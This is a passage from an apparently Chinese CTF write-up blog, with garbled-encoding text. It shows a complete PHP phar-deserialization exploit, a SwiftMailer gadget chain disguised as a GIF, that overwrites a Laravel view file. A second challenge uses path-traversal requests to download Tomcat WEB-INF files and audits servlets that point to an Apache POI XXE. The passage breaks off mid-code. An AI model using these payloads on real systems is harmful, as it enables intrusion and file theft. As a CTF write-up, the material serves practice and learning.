<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">path=phar:///var/www/html/storage/app/public</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Write sequence.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_sequence</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * StreamFilters.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_StreamFilter[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filters</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A buffer for writing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_writeBuffer</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bound streams.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Swift_InputByteStream[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_mirrors</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add a StreamFilter to this InputByteStream.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Swift_StreamFilter $filter</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string             $key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFilter</span>(<span class="params">Swift_StreamFilter <span class="variable">$filter</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filters[<span class="variable">$key</span>] = <span class="variable">$filter</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Remove an already present StreamFilter based on its $key.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFilter</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;_filters[<span class="variable">$key</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes $bytes to the end of the stream.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $bytes</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$bytes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_writeBuffer .= <span class="variable">$bytes</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filters <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$filter</span>-&gt;shouldBuffer(<span class="keyword">$this</span>-&gt;_writeBuffer)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_doWrite(<span class="keyword">$this</span>-&gt;_writeBuffer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ++<span class="keyword">$this</span>-&gt;_sequence;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * For any bytes that are currently buffered inside the stream, force them</span></span><br><span class="line"><span class="comment">     * off the buffer.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_doWrite(<span class="keyword">$this</span>-&gt;_writeBuffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Attach $is to this stream.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The stream acts as an observer, receiving all data that is written.</span></span><br><span class="line"><span class="comment">     * All &#123;<span class="doctag">@link</span> write()&#125; and &#123;<span class="doctag">@link</span> flushBuffers()&#125; operations will be mirrored.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Swift_InputByteStream $is</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bind</span>(<span class="params">Swift_InputByteStream <span class="variable">$is</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mirrors[] = <span class="variable">$is</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Remove an already bound stream.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If $is is not bound, no errors will be raised.</span></span><br><span class="line"><span class="comment">     * If the stream currently has any buffered data it will be written to $is</span></span><br><span class="line"><span class="comment">     * before unbinding occurs.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Swift_InputByteStream $is</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unbind</span>(<span class="params">Swift_InputByteStream <span class="variable">$is</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_mirrors <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$stream</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$is</span> === <span class="variable">$stream</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_writeBuffer !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="variable">$stream</span>-&gt;write(<span class="keyword">$this</span>-&gt;_writeBuffer);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;_mirrors[<span class="variable">$k</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Flush the contents of the stream (empty it) and set the internal pointer</span></span><br><span class="line"><span class="comment">     * to the beginning.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flushBuffers</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_writeBuffer !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_doWrite(<span class="keyword">$this</span>-&gt;_writeBuffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_flush();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_mirrors <span class="keyword">as</span> <span class="variable">$stream</span>) &#123;</span><br><span class="line">            <span class="variable">$stream</span>-&gt;flushBuffers();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Run $bytes through all filters */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_filter</span>(<span class="params"><span class="variable">$bytes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filters <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$bytes</span> = <span class="variable">$filter</span>-&gt;filter(<span class="variable">$bytes</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bytes</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Just write the bytes to the stream */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_doWrite</span>(<span class="params"><span class="variable">$bytes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_commit(<span class="keyword">$this</span>-&gt;_filter(<span class="variable">$bytes</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_mirrors <span class="keyword">as</span> <span class="variable">$stream</span>) &#123;</span><br><span class="line">            <span class="variable">$stream</span>-&gt;write(<span class="variable">$bytes</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_writeBuffer = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_FileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_AbstractFilterableInputStream</span></span>&#123;</span><br><span class="line">    <span class="comment">/** The internal pointer offset */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_offset</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The path to the file */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The mode this file is opened in for writing */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_mode</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for reading the file */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_reader</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** A lazy-loaded resource handle for writing the file */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_writer</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If magic_quotes_runtime is on, this will be true */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_quotes</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** If stream is seekable true/false, or null if not known */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_seekable</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new FileByteStream for $path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool   $writable if true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$writable</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Swift_IoException(<span class="string">&#x27;The path cannot be empty&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_path = <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_mode = <span class="variable">$writable</span> ? <span class="string">&#x27;w+b&#x27;</span> : <span class="string">&#x27;rb&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="string">&#x27;get_magic_quotes_runtime&#x27;</span>) &amp;&amp; @get_magic_quotes_runtime() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_quotes = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the complete path to the file.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPath</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Swift_ByteStream_TemporaryFileByteStream</span> <span class="keyword">extends</span> <span class="title">Swift_ByteStream_FileByteStream</span></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Swift_IoException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// /var/www/html/resources/views/auth/flag.blade.php =&gt; 73eb5933be1eb2293500f4a74b45284fd453f0bb</span></span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&#x27;/var/www/html/storage/framework/views/73eb5933be1eb2293500f4a74b45284fd453f0bb.php&#x27;</span>;</span><br><span class="line">        <span class="built_in">parent</span>::__construct(<span class="variable">$path</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream());</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;ameuu.phar&quot;</span>); <span class="comment">//.pharæ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//å›ºå®šçš„</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>); <span class="comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">copy(<span class="string">&#x27;./ameuu.phar&#x27;</span>,<span class="string">&#x27;ameuu.gif&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-filejava"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-filejava" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava</h2><ul>
<li>xxe</li>
</ul>
<p>é¦–å…ˆæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œéšæ„ä¸Šä¼ æ–‡ä»¶ï¼Œå¥½åƒæ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤çš„åœ°æ–¹ï¼Œå­˜åœ¨æ–‡ä»¶ä¸‹è½½ã€‚ä¸€çœ‹æ ¼å¼å°±ç»å…¸ä»»æ„æ–‡ä»¶ä¸‹è½½äº†ï¼ŒæŸ¥çœ‹æŠ¥é”™ç•Œé¢æ˜¯<code>Apache Tomcat/8.5.54</code>ï¼Œé‚£ä¹ˆç›´æ¥æŸ¥çœ‹<code>web.xml</code></p>
<p><img src="https://img-blog.csdnimg.cn/53d2790680f14d11b41d5daef9642dbe.png" alt="image-20220624195417391"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=../../../../WEB-INF/web.xml</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dc28450cb73a48ffa178973d465732f9.png" alt="image-20220624195717865"></p>
<p>ç›´æ¥æ ¹æ®è·¯å¾„ä¸‹è½½ç±»ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://8bf9ae81-9bfd-42d1-8ef0-d90e9518ebb7.node4.buuoj.cn:81/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/ListFileServlet.class</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</span><br><span class="line">../../../../WEB-INF/classes/cn/abc/servlet/ListFileServlet.class</span><br><span class="line">../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class</span><br></pre></td></tr></table></figure>

<h3 id="å®¡è®¡"><a href="#å®¡è®¡" class="headerlink" title="å®¡è®¡"></a>å®¡è®¡</h3><h5 id="DownloadServlet"><a href="#DownloadServlet" class="headerlink" title="DownloadServlet"></a><code>DownloadServlet</code></h5><p>postä¼ å‚ï¼Œä¸€ä¸ªå‚æ•°<code>filename</code>ï¼Œæ–‡ä»¶åå†…ä¸å…è®¸åŒ…å«<code>flag</code>å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ä¼šåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ å¦‚æœå­˜åœ¨åˆ™å°†è¾“å‡ºå­—èŠ‚æµ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String fileName = request.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">    fileName = <span class="keyword">new</span> String(fileName.getBytes(<span class="string">&quot;ISO8859-1&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;filename=&quot;</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> (fileName != <span class="keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;ç¦æ­¢è¯»å–&quot;</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    String fileSaveRootPath = getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);</span><br><span class="line">    File file = <span class="keyword">new</span> File(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">      request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;æ‚¨è¦ä¸‹è½½çš„èµ„æºå·²è¢«åˆ é™¤!&quot;</span>);</span><br><span class="line">      request.getRequestDispatcher(<span class="string">&quot;/message.jsp&quot;</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    String realname = fileName.substring(fileName.indexOf(<span class="string">&quot;_&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    FileInputStream in = <span class="keyword">new</span> FileInputStream(path + <span class="string">&quot;/&quot;</span> + fileName);</span><br><span class="line">    ServletOutputStream out = response.getOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((len = in.read(buffer)) &gt; <span class="number">0</span>)</span><br><span class="line">      out.write(buffer, <span class="number">0</span>, len); </span><br><span class="line">    in.close();</span><br><span class="line">    out.close();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">findFileSavePathByFileName</span><span class="params">(String filename, String saveRootPath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashCode = filename.hashCode();</span><br><span class="line">    <span class="keyword">int</span> dir1 = hashCode &amp; <span class="number">0xF</span>;</span><br><span class="line">    <span class="keyword">int</span> dir2 = (hashCode &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    String dir = saveRootPath + <span class="string">&quot;/&quot;</span> + dir1 + <span class="string">&quot;/&quot;</span> + dir2;</span><br><span class="line">    File file = <span class="keyword">new</span> File(dir);</span><br><span class="line">    <span class="keyword">if</span> (!file.exists())</span><br><span class="line">      file.mkdirs(); </span><br><span class="line">    <span class="keyword">return</span> dir;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ListFileServlet"><a href="#ListFileServlet" class="headerlink" title="ListFileServlet"></a><code>ListFileServlet</code></h5><p>å­˜åœ¨<code>saveFilename</code>å’Œ<code>filename</code>ä¸¤ä¸ªå‚æ•°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„åœ°æ–¹</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListFileServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String uploadFilePath = getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    Map&lt;String, String&gt; fileNameMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    String saveFilename = (String)request.getAttribute(<span class="string">&quot;saveFilename&quot;</span>);</span><br><span class="line">    String filename = (String)request.getAttribute(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;saveFilename&quot;</span> + saveFilename);</span><br><span class="line">    System.out.println(<span class="string">&quot;filename&quot;</span> + filename);</span><br><span class="line">    String realName = saveFilename.substring(saveFilename.indexOf(<span class="string">&quot;_&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    fileNameMap.put(saveFilename, filename);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;fileNameMap&quot;</span>, fileNameMap);</span><br><span class="line">    request.getRequestDispatcher(<span class="string">&quot;/listfile.jsp&quot;</span>).forward((ServletRequest)request, (ServletResponse)response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="UploadServlet"><a href="#UploadServlet" class="headerlink" title="UploadServlet"></a><code>UploadServlet</code></h5><p>æ–‡ä»¶ä¸Šä¼ æ“ä½œï¼Œå­˜åœ¨æŠ¥é”™<code>poi-ooxml-3.10 has something wrong</code>hintï¼ &gt;&gt; <a href="https://www.jianshu.com/p/73cd11d83c30">Apache POI XMLå¤–éƒ¨å®ä½“ï¼ˆXML External Entityï¼ŒXXEï¼‰æ”»å‡»è¯¦è§£ - ç®€ä¹¦ (jianshu.com)</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String savePath = getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/upload&quot;</span>);</span><br><span class="line">    String tempPath = getServletContext().getRealPath(<span class="string">&quot;/WEB-INF/temp&quot;</span>);</span><br><span class="line">    File tempFile = <span class="keyword">new</span> File(tempPath);</span><br><span class="line">    <span class="keyword">if</span> (!tempFile.exists())</span><br><span class="line">      tempFile.mkdir(); </span><br><span class="line">    String message = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">      factory.setSizeThreshold(<span class="number">102400</span>);</span><br><span class="line">      factory.setRepository(tempFile);</span><br><span class="line">      ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload((FileItemFactory)factory);</span><br><span class="line">      upload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">      upload.setFileSizeMax(<span class="number">1048576L</span>);</span><br><span class="line">      upload.setSizeMax(<span class="number">10485760L</span>);</span><br><span class="line">      <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request))</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">      List&lt;FileItem&gt; list = upload.parseRequest(request);</span><br><span class="line">      <span class="keyword">for</span> (FileItem fileItem : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">          String name = fileItem.getFieldName();</span><br><span class="line">          String str = fileItem.getString(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        String filename = fileItem.getName();</span><br><span class="line">        <span class="keyword">if</span> (filename == <span class="keyword">null</span> || filename.trim().equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">          <span class="keyword">continue</span>; </span><br><span class="line">        String fileExtName = filename.substring(filename.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        InputStream in = fileItem.getInputStream();</span><br><span class="line">        <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName))</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">            Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">          &#125; <span class="keyword">catch</span> (InvalidFormatException e) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">          &#125;  